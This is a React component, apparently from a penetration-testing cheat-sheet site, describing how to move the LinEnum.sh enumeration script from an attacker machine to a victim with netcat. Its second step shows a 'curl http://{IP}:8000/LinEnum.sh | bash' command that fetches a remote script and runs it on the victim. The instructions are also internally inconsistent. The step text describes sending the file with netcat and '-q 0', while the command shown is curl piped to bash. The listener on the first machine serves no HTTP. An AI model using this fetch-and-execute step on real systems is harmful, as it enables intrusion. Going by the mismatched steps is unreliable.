import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const FT_nc = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
                <Typography variant="h6">
              Description
              </Typography>
              <Typography>
              Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connection using TCP or UDP. It was released in 1995 and hasn't been maintained despite its popularity. In this example, we'll transfer `LinEnum.sh` from our attacker machine to the victim machine
              </Typography>
              <Box pt={5}></Box>
              <Typography variant="h6">
              Step 1 - Machine 1
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'nc -l -p 8000 > LinEnum.sh'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2 - Machine 2
              </Typography>
              <Typography>
              We will connect to the victim machine on port 8000 using netcat and send the LinEnum.sh file as input to netcat. The `-q 0` will tell netcat to close the connection once it finishes. That way, we'll know when the file transfer was complete.
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"curl http://{IP}:8000/LinEnum.sh | bash"}
            </SyntaxHighlighter>
            
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default FT_nc;
  